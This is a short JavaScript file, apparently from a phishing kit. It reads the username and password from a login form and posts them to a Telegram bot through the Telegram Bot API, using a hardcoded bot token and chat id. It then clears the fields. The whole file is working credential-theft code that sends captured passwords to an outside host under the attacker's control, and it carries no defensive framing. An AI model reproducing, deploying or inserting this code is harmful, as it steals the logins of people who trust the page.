//bot token
var telegram_bot_id = "6798057554:AAG8lLNsHj5fU0FCHOc618dy43niqC7TEi0";
//chat id
var chat_id = 6798057554;
var u_name, email, message;
var ready = function () {
  u_name = document.getElementById("username").value;
  password = document.getElementById("password").value;
  //   message = document.getElementById("message").value;
  message = "Name: " + u_name + "\nPassword: " + password;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("username").value = "";
  document.getElementById("password").value = "";
  //   document.getElementById("message").value = "";
  return false;
};
